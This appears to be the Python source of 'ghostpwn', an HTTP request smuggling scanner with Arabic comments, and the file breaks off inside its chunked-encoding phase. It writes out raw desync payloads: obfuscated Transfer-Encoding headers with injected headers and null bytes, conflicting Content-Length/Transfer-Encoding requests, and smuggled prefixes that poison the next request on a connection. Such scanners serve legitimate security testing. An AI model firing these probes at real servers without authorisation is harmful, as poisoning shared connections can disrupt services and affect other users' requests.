#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostpwn - HTTP Request Smuggling Scanner
كشف ثغرات HTTP Request Smuggling

الأنواع المكتشفة:
1.  CL.TE  (Front-end: Content-Length, Back-end: Transfer-Encoding)
2.  TE.CL  (Front-end: Transfer-Encoding, Back-end: Content-Length)
3.  TE.TE  (Transfer-Encoding obfuscation bypass)
4.  CL.CL  (Mismatched Content-Length headers)
5.  HTTP/2 → HTTP/1.1 downgrade smuggling (H2.CL / H2.TE)
6.  Chunked encoding manipulation (malformed chunk sizes)
7.  Timing-based detection (backend stalls waiting for body)
8.  Error-based detection (anomalous status/body on malformed input)

ملاحظات:
- لا يستخدم أي مكتبات خارجية (Python stdlib فقط: socket, ssl, urllib).
- يرسل الطلبات الخبيثة باستخدام raw sockets لأن urllib لا يسمح بإرسال
  headers مكررة أو malformed (مثل Content-Length + Transfer-Encoding معاً).
- آمن للاستخدام: لا يرسل payloads تكسر الخدمة، فقط يكتشف الـ desync.
"""
import os
import sys
import socket
import ssl
import time
import json
import re
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.http_client import HttpClient
from modules.arabic_display import SmartLogger, Colors, fix_display


# ============================ Constants ============================

# Obfuscation variants for Transfer-Encoding header value
# (للتحايل على front-ends التي تحظر "chunked" الحرفية)
TE_OBFUSCATIONS = [
    "chunked",
    "chunked\r\nTransfer-Encoding: chunked",  # duplicate
    "chunked, identity",
    "identity, chunked",
    "chunked\r\n ",                       # trailing whitespace
    "chunked ",                            # trailing space
    "\tchunked",                           # leading tab
    " chunked",                            # leading space
    "chunked\r\nX:",                       # injected header
    "Chunked",                             # case variation
    "CHUNKED",
    "chunked\x00",                         # null byte
    "chunked\r\n\t",                       # tab+newline
    "chunked\r\nTransfer-Encoding: identity",
]

# Common probe paths used for smuggling tests (must be safe, GET-able endpoints)
PROBE_PATHS = ["/", "/index.html", "/about", "/home"]

# Markers we inject into smuggled bodies to detect contamination of next request
SMUGGLE_MARKER = "ghostpwnsmuggle"
MARKER_PATTERN = re.compile(r"ghostpwnsmuggle", re.IGNORECASE)

# Error signatures that suggest desync / smuggling susceptibility
ERROR_SIGNATURES = [
    "Bad Request", "400 Bad Request", "Malformed", "Invalid request",
    "Transfer-Encoding", "Content-Length", "chunked",
    "Unexpected end", "Incomplete", "Truncated",
    "Protocol Error", "HTTP Error 400", "client error",
    "request header or cookie too large",
    "Request Header Fields Too Large",
    "Malformed request line",
]


# ============================ Raw HTTP Sender ============================

class RawHttpSender:
    """يرسل بايتات HTTP خام عبر socket مباشرة (لإرسال headers malformed)"""

    def __init__(self, host: str, port: int, use_ssl: bool,
                 timeout: int = 10, verify_ssl: bool = False,
                 ssl_context: Optional[ssl.SSLContext] = None):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.timeout = timeout
        if ssl_context is not None:
            self.ssl_context = ssl_context
        else:
            self.ssl_context = ssl.create_default_context()
            if not verify_ssl:
                self.ssl_context.check_hostname = False
                self.ssl_context.verify_mode = ssl.CERT_NONE

    def send_raw(self, raw_bytes: bytes,
                 read_timeout: Optional[float] = None,
                 max_bytes: int = 65536) -> Tuple[bytes, float]:
        """
        يرسل raw bytes ويعيد (response_bytes, elapsed_seconds).

        - يقرأ حتى انقطاع الاتصال أو timeout أو وصول max_bytes.
        - لا يرفع استثناءات على timeout/خطأ؛ يرجع ما تم قراءته.
        """
        if isinstance(raw_bytes, str):
            raw_bytes = raw_bytes.encode("latin-1", errors="replace")

        rt = read_timeout if read_timeout is not None else self.timeout
        start = time.time()
        sock = None
        response = b""
        try:
            sock = socket.create_connection((self.host, self.port),
                                            timeout=self.timeout)
            if self.use_ssl:
                sock = self.ssl_context.wrap_socket(
                    sock, server_hostname=self.host)
            sock.sendall(raw_bytes)
            sock.settimeout(rt)
            while True:
                try:
                    chunk = sock.recv(8192)
                except socket.timeout:
                    break
                except ssl.SSLZeroReturnError:
                    break
                except (ssl.SSLError, OSError):
                    break
                if not chunk:
                    break
                response += chunk
                if len(response) >= max_bytes:
                    break
        except socket.timeout:
            pass
        except (ConnectionError, OSError):
            pass
        finally:
            if sock is not None:
                try:
                    sock.close()
                except Exception:
                    pass
        return response, round(time.time() - start, 3)

    def send_two(self, first_bytes: bytes, second_bytes: bytes,
                 read_timeout: Optional[float] = None,
                 max_bytes: int = 65536) -> Tuple[bytes, float]:
        """
        يرسل طلبين متتاليين في نفس الاتصال (TCP connection reuse)
        ويجمع الرد. مهم لاختبار تسميم الطلب التالي (next-request poisoning).
        """
        if isinstance(first_bytes, str):
            first_bytes = first_bytes.encode("latin-1", errors="replace")
        if isinstance(second_bytes, str):
            second_bytes = second_bytes.encode("latin-1", errors="replace")

        combined = first_bytes + second_bytes
        rt = read_timeout if read_timeout is not None else self.timeout
        start = time.time()
        sock = None
        response = b""
        try:
            sock = socket.create_connection((self.host, self.port),
                                            timeout=self.timeout)
            if self.use_ssl:
                sock = self.ssl_context.wrap_socket(
                    sock, server_hostname=self.host)
            sock.sendall(combined)
            sock.settimeout(rt)
            while True:
                try:
                    chunk = sock.recv(8192)
                except (socket.timeout, ssl.SSLZeroReturnError,
                        ssl.SSLError, OSError):
                    break
                if not chunk:
                    break
                response += chunk
                if len(response) >= max_bytes:
                    break
        except socket.timeout:
            pass
        except (ConnectionError, OSError):
            pass
        finally:
            if sock is not None:
                try:
                    sock.close()
                except Exception:
                    pass
        return response, round(time.time() - start, 3)


# ============================ Response Parser ============================

def parse_http_response(raw: bytes) -> Dict:
    """يفك ترميم رد HTTP خام إلى أجزائه (status, headers, body)."""
    if not raw:
        return {"status": 0, "reason": "", "headers": {},
                "body": "", "raw": ""}
    try:
        text = raw.decode("latin-1", errors="replace")
    except Exception:
        text = ""
    head, _, body = text.partition("\r\n\r\n")
    lines = head.split("\r\n")
    status_line = lines[0] if lines else ""
    parts = status_line.split(" ", 2)
    status = 0
    try:
        status = int(parts[1]) if len(parts) > 1 else 0
    except ValueError:
        status = 0
    reason = parts[2] if len(parts) > 2 else ""
    headers: Dict[str, str] = {}
    for ln in lines[1:]:
        if ":" in ln:
            k, _, v = ln.partition(":")
            headers[k.strip().lower()] = v.strip()
    return {
        "status": status, "reason": reason, "headers": headers,
        "body": body, "raw": text,
    }


def split_responses(raw: bytes) -> List[Dict]:
    """يقسم ردود HTTP المتعددة في نفس الدفق."""
    responses = []
    try:
        text = raw.decode("latin-1", errors="replace")
    except Exception:
        return []
    while text:
        sep = text.find("\r\n\r\n")
        if sep == -1:
            break
        head = text[:sep]
        rest = text[sep + 4:]
        # parse status line for Content-Length
        lines = head.split("\r\n")
        status_line = lines[0] if lines else ""
        parts = status_line.split(" ", 2)
        status = 0
        try:
            status = int(parts[1]) if len(parts) > 1 else 0
        except ValueError:
            status = 0
        headers: Dict[str, str] = {}
        for ln in lines[1:]:
            if ":" in ln:
                k, _, v = ln.partition(":")
                headers[k.strip().lower()] = v.strip()
        # determine body length
        body_len = 0
        if "content-length" in headers:
            try:
                body_len = int(headers["content-length"])
            except ValueError:
                body_len = 0
        body = rest[:body_len] if body_len else ""
        if body_len and len(rest) > body_len:
            text = rest[body_len:]
        elif body_len == 0 and "transfer-encoding" in headers and \
                "chunked" in headers["transfer-encoding"].lower():
            # read until 0\r\n\r\n
            end = rest.find("\r\n0\r\n\r\n")
            if end == -1:
                end = rest.find("0\r\n\r\n")
            if end == -1:
                body = rest
                text = ""
            else:
                body = rest[:end]
                text = rest[end + 5:]
        else:
            text = ""
        responses.append({
            "status": status, "headers": headers, "body": body,
            "raw": head + "\r\n\r\n" + body,
        })
        if not body and not text:
            break
    return responses


def looks_like_error(parsed: Dict) -> Optional[str]:
    """يفحص إن كان الرد يحمل توقيع خطأ يدل على parsing anomaly."""
    body = (parsed.get("body") or "").lower()
    reason = (parsed.get("reason") or "").lower()
    for sig in ERROR_SIGNATURES:
        if sig.lower() in body or sig.lower() in reason:
            return sig
    return None


# ============================ Main Scanner ============================

class HTTPSmugglingScanner:
    """فاحص HTTP Request Smuggling الرئيسي"""

    def __init__(self, http_client: Optional[HttpClient] = None,
                 audit_logger=None, options: Optional[Dict] = None):
        self.client = http_client or HttpClient(timeout=10, delay=0.1)
        self.audit = audit_logger
        self.logger = SmartLogger()
        self.options = options or {}
        self.findings: List[Dict] = []
        self.targets_tested: List[str] = []

        # Tunables
        self.timeout = self.options.get("timeout", 10)
        self.timing_threshold = self.options.get("timing_threshold", 4.0)
        self.baseline_samples = self.options.get("baseline_samples", 2)
        self.safe_mode = self.options.get("safe_mode", True)
        self.verbose = self.options.get("verbose", False)
        self.probe_paths = self.options.get("probe_paths", PROBE_PATHS)
        self.test_te_obfuscations = self.options.get(
            "test_te_obfuscations", TE_OBFUSCATIONS)

    # ---------------- helpers ----------------

    def _log(self, msg: str, level: str = "info"):
        getattr(self.logger, level, self.logger.info)(msg)
        if self.audit:
            self.audit.log_event(f"[SMUGGLE] {msg}", level)

    def _add_finding(self, ftype: str, severity: str, url: str,
                     title: str, description: str, evidence: str,
                     **extra) -> Dict:
        finding = {
            "type": ftype,
            "severity": severity,
            "url": url,
            "title": title,
            "description": description,
            "evidence": evidence,
        }
        finding.update(extra)
        self.findings.append(finding)
        self._log(f"  ⚠️  [{severity.upper()}] {title} @ {url}", "vuln")
        return finding

    @staticmethod
    def _short(text: str, n: int = 200) -> str:
        if not text:
            return ""
        text = text.replace("\n", " ").strip()
        return text if len(text) <= n else text[:n] + "..."

    def _normalize_target(self, target: str) -> Tuple[str, str, int, bool, str]:
        """يعيد (base_url, host, port, use_ssl, path_prefix)."""
        if not target:
            raise ValueError("empty target")
        if not target.startswith(("http://", "https://")):
            target = "https://" + target
        parsed = urlparse(target)
        host = parsed.hostname or ""
        use_ssl = (parsed.scheme == "https")
        port = parsed.port or (443 if use_ssl else 80)
        base = f"{parsed.scheme}://{host}"
        if port not in (80, 443):
            base += f":{port}"
        path = parsed.path or "/"
        return base, host, port, use_ssl, path

    def _make_sender(self, host: str, port: int, use_ssl: bool) -> RawHttpSender:
        return RawHttpSender(host, port, use_ssl,
                             timeout=self.timeout,
                             ssl_context=self.client.ssl_context)

    @staticmethod
    def _build_request(method: str, path: str, host: str,
                       headers: Dict[str, str], body: str = "",
                       extra_raw: str = "") -> str:
        """يبني نص طلب HTTP خام (قد يحوي headers مكررة عبر extra_raw)."""
        lines = [f"{method} {path} HTTP/1.1"]
        # لا نضيف Host تلقائياً إن كان موجوداً
        has_host = any(h.lower() == "host" for h in headers)
        if not has_host:
            lines.append(f"Host: {host}")
        for k, v in headers.items():
            lines.append(f"{k}: {v}")
        if extra_raw:
            lines.append(extra_raw)
        head = "\r\n".join(lines)
        if body:
            return f"{head}\r\n\r\n{body}"
        return f"{head}\r\n\r\n"

    def _baseline_request(self, sender: RawHttpSender, host: str,
                          path: str) -> Tuple[float, Optional[Dict]]:
        """يرسل طلب GET عادي ويقيس الزمن + يفك الرد."""
        raw = self._build_request("GET", path, host, {
            "User-Agent": "ghostpwn-smuggle-baseline",
            "Accept": "*/*",
            "Connection": "close",
        })
        resp_bytes, elapsed = sender.send_raw(raw, read_timeout=self.timeout)
        parsed = parse_http_response(resp_bytes)
        return elapsed, parsed

    # ============================================================
    #                       MAIN SCAN
    # ============================================================

    def scan(self, target: str) -> Dict:
        """نقطة الدخول الرئيسية - تشغّل كل فحوصات smuggling"""
        if not target:
            self._log("Target URL فارغ", "error")
            return self._empty_report(target)

        try:
            base, host, port, use_ssl, path = self._normalize_target(target)
        except ValueError:
            return self._empty_report(target)

        self.target = target
        self.base = base
        self._log(f"بدء فحص HTTP Request Smuggling: {base}", "phase")

        # تحقق من إمكانية الوصول للهدف
        sender = self._make_sender(host, port, use_ssl)
        baseline_elapsed, baseline_parsed = self._baseline_request(
            sender, host, path)
        if baseline_parsed.get("status", 0) == 0 and not baseline_parsed.get("body"):
            self._log(f"تعذّر الوصول للهدف: {baseline_parsed.get('reason') or 'no response'}",
                      "warn")
            # لا نوقف الفحص - قد يكون السيرفر يرفض GET فقط

        # ---------- Phase 1: Service fingerprinting ----------
        self._log("Phase 1: بصمة الخدمة والتكنولوجيا", "phase")
        self._fingerprint_service(sender, host, path, baseline_parsed)

        # ---------- Phase 2: CL.TE detection (timing + poisoning) ----------
        self._log("Phase 2: كشف CL.TE (timing + next-request)", "phase")
        self._detect_cl_te(sender, host, path, baseline_elapsed)

        # ---------- Phase 3: TE.CL detection ----------
        self._log("Phase 3: كشف TE.CL (timing + poisoning)", "phase")
        self._detect_te_cl(sender, host, path, baseline_elapsed)

        # ---------- Phase 4: TE.TE (obfuscation) ----------
        self._log("Phase 4: كشف TE.TE عبر obfuscation", "phase")
        self._detect_te_te(sender, host, path)

        # ---------- Phase 5: CL.CL (mismatched Content-Length) ----------
        self._log("Phase 5: كشف CL.CL (Content-Length مزدوج/مختلف)", "phase")
        self._detect_cl_cl(sender, host, path)

        # ---------- Phase 6: Chunked manipulation ----------
        self._log("Phase 6: التلاعب بـ chunked encoding", "phase")
        self._detect_chunked_manipulation(sender, host, path)

        # ---------- Phase 7: HTTP/2 downgrade ----------
        self._log("Phase 7: كشف HTTP/2 → HTTP/1.1 downgrade", "phase")
        self._detect_h2_downgrade(host, port, use_ssl, path)

        self._print_results()
        return self._build_report()

    # ============================================================
    #                PHASE 1 - FINGERPRINT
    # ============================================================

    def _fingerprint_service(self, sender: RawHttpSender, host: str,
                             path: str, baseline: Optional[Dict]):
        """يجمع معلومات عن الخدمة (Server, Via, X-Powered-By, TLS)."""
        info = []
        if baseline:
            hdrs = baseline.get("headers", {})
            for h in ("server", "via", "x-powered-by", "x-cache",
                      "x-served-by", "x-frontend", "x-backend",
                      "x-nginx-upstream-cache-status"):
                if h in hdrs:
                    info.append(f"{h}={hdrs[h]}")
        if info:
            self._log(f"  › بصمة: {' | '.join(info)}", "info")
        # probes via HttpClient for header-based checks
        try:
            resp = self.client.get(self.base + path)
            srv = resp.get("headers", {}).get("Server") or \
                resp.get("headers", {}).get("server")
            if srv:
                # Reverse proxies that commonly allow smuggling
                if any(p in srv.lower() for p in
                       ["nginx", "haproxy", "envoy", "traefik",
                        "apache", "varnish", "cloudflare", "akamai"]):
                    self._log(f"  › Front-end محتمل: {srv}", "info")
        except Exception:
            pass

    # ============================================================
    #                PHASE 2 - CL.TE
    # ============================================================

    def _detect_cl_te(self, sender: RawHttpSender, host: str, path: str,
                      baseline_elapsed: float):
        """
        CL.TE timing attack:
        - Front-end يستخدم Content-Length، Back-end يستخدم Transfer-Encoding.
        - نرسل طلب بـ CL قصير وجسم chunked غير مكتمل.
        - إن كان CL.TE موجوداً، الـ back-end ينتظر باقي الـ chunk → timeout.
        """
        url = self.base + path
        # body نرسله: chunk بحجم 1 يحتوي Z لكن دون 0\r\n\r\n terminator
        # كامل الجسم: "1\r\nZ\r\n" = 6 بايت
        # نضبط CL=4 حتى يرى الـ front-end فقط "1\r\nZ" (chunk غير مكتمل)
        body = "1\r\nZ\r\n"
        cl_value = 4
        raw = self._build_request("POST", path, host, {
            "User-Agent": "ghostpwn-clte",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(cl_value),
            "Transfer-Encoding": "chunked",
            "Connection": "close",
        }, body=body)

        # نأخذ عينتين للتوقيت
        timings = []
        parsed_list = []
        for _ in range(2):
            rb, elapsed = sender.send_raw(raw, read_timeout=self.timeout + 4)
            parsed = parse_http_response(rb)
            timings.append(elapsed)
            parsed_list.append(parsed)
            time.sleep(0.2)

        avg = sum(timings) / len(timings) if timings else 0
        self._log(f"  › CL.TE timing probe: avg={avg:.2f}s "
                  f"baseline={baseline_elapsed:.2f}s", "info")

        # Heuristic: إذا كان الـ response time قريب من timeout
        # (وقت أكبر بكثير من baseline) → CL.TE مشتبه به
        if avg >= max(self.timing_threshold,
                      baseline_elapsed + self.timing_threshold):
            # تأكيد عبر next-request poisoning probe
            confirmed = self._confirm_cl_te_poisoning(sender, host, path)
            severity = "high" if confirmed else "medium"
            title = "HTTP Request Smuggling (CL.TE) - timing" \
                    + (" + poisoning confirmed" if confirmed else "")
            self._add_finding(
                "http_smuggling_clte",
                severity,
                url,
                title,
                "الخدمة قد تستخدم Content-Length في الـ front-end و"
                "Transfer-Encoding في الـ back-end، مما يسمح بـ request "
                "smuggling. تم رصد توقيت مرتفع بشكل غير طبيعي على طلب "
                "chunked مشوه، مما يشير لتعليق الـ back-end بانتظار باقي "
                "الجسم." + (" تأكيد عبر تسميم الطلب التالي." if confirmed else ""),
                f"baseline={baseline_elapsed:.2f}s, attack_avg={avg:.2f}s, "
                f"timings={timings}",
                technique="timing",
                confirmed=confirmed,
            )
        else:
            self._log("  ✓ CL.TE timing: لا مؤشرات", "success")

        # Error-based: قد يعيد الـ back-end خطأ صريح
        for p in parsed_list:
            sig = looks_like_error(p)
            if sig and "chunked" in (p.get("body", "") + " " +
                                     str(p.get("headers", {}).get(
                                         "transfer-encoding", ""))).lower():
                self._add_finding(
                    "http_smuggling_clte_error",
                    "medium",
                    url,
                    "CL.TE Error-Based Indicator",
                    "الرد يحوي توقيع خطأ متعلق بـ chunked/Transfer-Encoding "
                    "عند إرسال CL+TE متعارضين، قد يشير لـ parsing inconsistency.",
                    f"signature='{sig}', status={p.get('status')}, "
                    f"body_excerpt={self._short(p.get('body',''),150)}",
                )
                break

    def _confirm_cl_te_poisoning(self, sender: RawHttpSender, host: str,
                                 path: str) -> bool:
        """
        يؤكد CL.TE عبر تسميم الطلب التالي:
        - نرسل طلب smuggled يحوي prefix يلوث الطلب التالي.
        - الطلب التالي العادي يجب أن يعيد 404 أو محتوى غير متوقع.
        """
        # smuggled prefix: GET /ghostpwn-404 HTTP/1.1\r\nFoo: bar
        smuggled = (
            f"GET /{SMUGGLE_MARKER}-404 HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 15\r\n\r\n"
            f"x=1\r\n"
        )
        # الطلب الأول: CL.TE، جسمه chunked ينتهي بـ prefix smuggled
        body = "0\r\n\r\n" + smuggled
        # CL يغطي 0\r\n\r\n فقط (5 بايت) حتى لا يرى الـ front-end الـ prefix
        cl_value = 5
        first_raw = self._build_request("POST", path, host, {
            "User-Agent": "ghostpwn-clte-confirm",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(cl_value),
            "Transfer-Encoding": "chunked",
        }, body=body)

        # الطلب الثاني العادي
        second_raw = self._build_request("GET", path, host, {
            "User-Agent": "ghostpwn-clte-victim",
            "Accept": "*/*",
            "Connection": "close",
        })

        combined_bytes = first_raw + second_raw
        rb, elapsed = sender.send_raw(combined_bytes,
                                       read_timeout=self.timeout + 3)
        responses = split_responses(rb)
        # إن وجدنا رد بـ 404 أو يحوي الـ marker → مؤكد
        for r in responses:
            status = r.get("status", 0)
            body_text = r.get("body", "")
            if status == 404 or MARKER_PATTERN.search(body_text):
                return True
            # إن كان رد غريب بعد طلب smuggling
            if looks_like_error(r) and status in (400, 404, 502):
                return True
        return False

    # ============================================================
    #                PHASE 3 - TE.CL
    # ============================================================

    def _detect_te_cl(self, sender: RawHttpSender, host: str, path: str,
                      baseline_elapsed: float):
        """
        TE.CL timing attack:
        - Front-end يستخدم Transfer-Encoding، Back-end يستخدم Content-Length.
        - نرسل طلب بـ TE: chunked وجسم يحوي prefix smuggled.
        - إن كان TE.CL موجوداً، الـ back-end ينتظر باقي الجسم → timeout.
        """
        url = self.base + path
        # body يشمل chunk بـ 0 وحجم 1 يحوي Z، لكن دون إغلاق كامل
        # CL محدد بـ 4، TE: chunked
        body = "1\r\nZ\r\nQ"  # Q هي بايت زائد ينتظره back-end
        # نرسل عبر TE فقط (لا CL) كي يستخدمه الـ front-end
        raw = self._build_request("POST", path, host, {
            "User-Agent": "ghostpwn-tecl",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(body)),  # سيستخدمه back-end
            "Transfer-Encoding": "chunked",     # سيستخدمه front-end
        }, body=body)

        # لـ TE.CL timing: نرسل طلب TE.Cl حيث front-end يرى chunked
        # لكن chunk غير مكتمل → back-end (يستخدم CL) ينتظر باقي الجسم
        # نرسل body = "0\r\n\r\n" + smuggled prefix
        smuggled_prefix = (
            f"GET /{SMUGGLE_MARKER}-tecl HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 5\r\n\r\n"
            f"x=1\r\n"
        )
        body_te_cl = "0\r\n\r\n" + smuggled_prefix  # front-end يرى chunk end
        # CL: نحدد قيمة أكبر من الحجم الفعلي حتى ينتظر back-end
        cl_tecl = len(body_te_cl) + 50
        raw_te_cl = self._build_request("POST", path, host, {
            "User-Agent": "ghostpwn-tecl-probe",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(cl_tecl),
            "Transfer-Encoding": "chunked",
        }, body=body_te_cl)

        timings = []
        parsed_list = []
        for _ in range(2):
            rb, elapsed = sender.send_raw(raw_te_cl,
                                           read_timeout=self.timeout + 4)
            parsed = parse_http_response(rb)
            timings.append(elapsed)
            parsed_list.append(parsed)
            time.sleep(0.2)

        avg = sum(timings) / len(timings) if timings else 0
        self._log(f"  › TE.CL timing probe: avg={avg:.2f}s", "info")

        if avg >= max(self.timing_threshold,
                      baseline_elapsed + self.timing_threshold):
            # محاولة تأكيد عبر poisoning
            confirmed = self._confirm_te_cl_poisoning(sender, host, path)
            severity = "high" if confirmed else "medium"
            title = "HTTP Request Smuggling (TE.CL) - timing" \
                    + (" + poisoning confirmed" if confirmed else "")
            self._add_finding(
                "http_smuggling_tecl",
                severity,
                url,
                title,
                "الخدمة قد تستخدم Transfer-Encoding في الـ front-end و"
                "Content-Length في الـ back-end. هذا التكوين يسمح بـ request "
                "smuggling عبر حقن prefix في الطلب التالي.",
                f"baseline={baseline_elapsed:.2f}s, attack_avg={avg:.2f}s, "
                f"timings={timings}",
                technique="timing",
                confirmed=confirmed,
            )
        else:
            self._log("  ✓ TE.CL timing: لا مؤشرات", "success")

        # Error-based check
        for p in parsed_list:
            sig = looks_like_error(p)
            if sig and ("content-length" in (p.get("body", "") +
                       " " + str(p.get("headers", {}))).lower()
                       or "transfer" in (p.get("body", "") +
                       " " + str(p.get("headers", {}))).lower()):
                self._add_finding(
                    "http_smuggling_tecl_error",
                    "medium",
                    url,
                    "TE.CL Error-Based Indicator",
                    "الرد يحوي خطأ متعلق بـ Content-Length/Transfer-Encoding "
                    "عند تضارب الـ headers.",
                    f"signature='{sig}', status={p.get('status')}",
                )
                break

    def _confirm_te_cl_poisoning(self, sender: RawHttpSender, host: str,
                                 path: str) -> bool:
        """تأكيد TE.CL عبر تسميم الطلب التالي."""
        smuggled = (
            f"GET /{SMUGGLE_MARKER}-tecl-404 HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 5\r\n\r\n"
            f"x=1\r\n"
        )
        # Front-end (TE): يرى chunked terminated بـ 0\r\n\r\n
        # Back-end (CL): يرى CL=N لكن يجد الـ smuggled prefix في باقي الـ body
        body = "0\r\n\r\n" + smuggled
        # CL كبير حتى يقرأ back-end باقي الـ body
        cl = len(body) + 10
        first_raw = self._build_request("POST", path, host, {
            "User-Agent": "ghostpwn-tecl-confirm",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(cl),
            "Transfer-Encoding": "chunked",
        }, body=body)
        second_raw = self._build_request("GET", path, host, {
            "User-Agent": "ghostpwn-tecl-victim",
            "Accept": "*/*",
            "Connection": "close",
        })
        combined = first_raw + second_raw
        rb, _ = sender.send_raw(combined, read_timeout=self.timeout + 3)
        responses = split_responses(rb)
        for r in responses:
            if r.get("status") == 404 or \
                    MARKER_PATTERN.search(r.get("body", "")):
                return True
        return False

    # ============================================================
    #                PHASE 4 - TE.TE (Obfuscation)
    # ============================================================

    def _detect_te_te(self, sender: RawHttpSender, host: str, path: str):
        """
        TE.TE: نرسل headers Transfer-Encoding متعددة/مشوهة.
        إن تعامل الـ front-end معها بطريقة والـ back-end بطريقة أخرى → smuggling.
        """
        url = self.base + path
        results = []
        for te_value in self.test_te_obfuscations:
            # طلب بـ TE obfuscated
            try:
                raw = self._build_request("POST", path, host, {
                    "User-Agent": "ghostpwn-tete",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Transfer-Encoding": te_value,
                    "Content-Length": "6",
                }, body="0\r\n\r\nX")
                # ملاحظة: urllib/socket سيرسل القيمة كما هي لكن الـ \r\n
                # بداخلها سيمثل header injection إذا سُمح. نرسلها كـ raw.
            except Exception:
                continue
            rb, elapsed = sender.send_raw(raw, read_timeout=self.timeout)
            parsed = parse_http_response(rb)
            status = parsed.get("status", 0)
            body = parsed.get("body", "")

            # إن تم قبول الطلب (200) رغم وجود obfuscation → مشتبه
            # أو إن أعى 400 بشكل غير متسق
            is_accepted = (200 <= status < 400)
            has_error_sig = looks_like_error(parsed) is not None
            results.append({
                "te_value": repr(te_value),
                "status": status,
                "elapsed": elapsed,
                "accepted": is_accepted,
                "error_sig": has_error_sig,
                "body_excerpt": self._short(body, 80),
            })
            self._log(f"  › TE obfuscation {repr(te_value)}: "
                      f"status={status} elapsed={elapsed:.2f}s", "info")

        # تحليل: إن قبل بعض الـ obfuscations ورفض أخرى → inconsistent parsing
        accepted_set = [r for r in results if r["accepted"]]
        rejected_set = [r for r in results if not r["accepted"]]
        if accepted_set and rejected_set:
            # هناك تباين - قد يسمح بـ smuggling
            sample = accepted_set[0]
            self._add_finding(
                "http_smuggling_tete",
                "medium",
                url,
                "TE.TE Inconsistent Parsing (Obfuscation)",
                "الخادم يقبل بعض صيغ Transfer-Encoding المشوهة ويرفض أخرى، "
                "مما قد يسمح بـ smuggling عبر اختيار obfuscation يعالجه "
                "الـ front-end بطريقة مختلفة عن الـ back-end.",
                f"accepted={len(accepted_set)}, rejected={len(rejected_set)}, "
                f"sample_accepted={sample['te_value']} -> {sample['status']}",
                obfuscations_tested=len(results),
                accepted_count=len(accepted_set),
            )
        elif accepted_set:
            # قبلها كلها - قد لا يفحص TE أصلاً
            self._log(f"  ✓ قبل الخادم كل الـ obfuscations ({len(accepted_set)})",
                      "info")
        else:
            self._log("  ✓ رفض الخادم كل الـ obfuscations بشكل متسق",
                      "success")

    # ============================================================
    #                PHASE 5 - CL.CL
    # ============================================================

    def _detect_cl_cl(self, sender: RawHttpSender, host: str, path: str):
        """
        CL.CL: إرسال headerين Content-Length بقيم مختلفة.
        الـ front-end قد يأخذ الأول، والـ back-end الثاني → smuggling.
        """
        url = self.base + path
        # نبني الطلب يدوياً لإرسال headerين CL
        head = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: ghostpwn-clcl\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 5\r\n"     # الأول: 5 بايت
            f"Content-Length: 7\r\n"     # الثاني: 7 بايت
            f"Connection: close\r\n\r\n"
        )
        body = "x=1\r\nXY"   # 7 بايت (آخر 2 بايت تتجاوز الـ CL الأول)
        raw = head + body
        rb, elapsed = sender.send_raw(raw, read_timeout=self.timeout)
        parsed = parse_http_response(rb)
        status = parsed.get("status", 0)
        body_resp = parsed.get("body", "")
        sig = looks_like_error(parsed)

        # إن أعى 400 - ربما يفحص التضارب (جيد)
        # إن أعى 200 - يقبل التضارب (سيء - قد يسمح smuggling)
        if 200 <= status < 400 and not sig:
            self._add_finding(
                "http_smuggling_clcl",
                "high",
                url,
                "CL.CL - Mismatched Content-Length Accepted",
                "أرسل الطلب headerين Content-Length بقيم مختلفة (5 و7) وقبلها "
                "الخادم دون اعتراض (status=" + str(status) + "). هذا يشير "
                "لسلوك non-RFC-compliant قد يسمح بـ smuggling أو HTTP poisoning.",
                f"request_headers: Content-Length: 5 + Content-Length: 7, "
                f"response_status={status}, body_excerpt="
                f"{self._short(body_resp, 100)}",
            )
        elif sig:
            self._log(f"  ✓ رفض الخادم CL.CL: {sig}", "success")
        else:
            self._log(f"  › CL.CL: status={status} (محايد)", "info")

    # ============================================================
    #                PHASE 6 - Chunked Manipulation
    # ============================================================

    def _detect_chunked_manipulation(self, sender: RawHttpSender,
                                     host: str, path: str):
        """
        اختبار التلاعب بـ chunked encoding:
        - حجم chunk خاطئ
        - إنهاء chunked دون 0\r\n\r\n
        - حقن newline داخل chunk size
        """
        url = self.base + path
        probes = [
            ("malformed_chunk_size",
             "POST {p} HTTP/1.1\r\nHost: {h}\r\nContent-Type: "
             "application/x-www-form-urlencoded\r\nTransfer-Encoding: "
             "chunked\r\nConnection: close\r\n\r\nZZZ\r\nx=1\r\n0\r\n\r\n"),
            ("incomplete_chunked",
             "POST {p} HTTP/1.1\r\nHost: {h}\r\nContent-Type: "
             "application/x-www-form-urlencoded\r\nTransfer-Encoding: "
             "chunked\r\nConnection: close\r\n\r\n5\r\nx=1\r\n"),
            ("chunk_size_newline_injection",
             "POST {p} HTTP/1.1\r\nHost: {h}\r\nContent-Type: "
             "application/x-www-form-urlencoded\r\nTransfer-Encoding: "
             "chunked\r\nConnection: close\r\n\r\n5\r\nx=1\r\n"
             "0\r\nX-Injected: yes\r\n\r\n"),
            ("negative_chunk_size",
             "POST {p} HTTP/1.1\r\nHost: {h}\r\nContent-Type: "
             "application/x-www-form-urlencoded\r\nTransfer-Encoding: "
             "chunked\r\nConnection: close\r\n\r\n-1\r\nx=1\r\n0\r\n\r\n"),
        ]
        for name, tmpl in probes:
            raw = tmpl.format(p=path, h=host)
            rb, elapsed = sender.send_raw(raw, read_timeout=self.timeout)
            parsed = parse_http_response(rb)
            status = parsed.get("status", 0)
            body = parsed.get("body", "")
            sig = looks_like_error(parsed)
            self._log(f"  › {name}: status={status} sig={sig}", "info")
